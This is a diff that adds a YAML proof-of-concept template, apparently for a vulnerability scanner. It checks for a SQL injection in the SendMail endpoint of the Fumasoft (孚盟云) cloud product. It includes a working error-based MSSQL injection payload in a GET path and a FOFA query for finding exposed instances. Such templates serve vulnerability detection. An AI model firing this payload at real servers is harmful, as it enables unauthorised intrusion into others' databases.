@@ -1,0 +1,17 @@
+id: poc-yaml-fumasoft-sendmail-sqli
+info:
+  name: 孚盟云 SendMail SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1+and+1%3Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))--
+  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"\"message\":")
+    && !contains(body,"<html") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
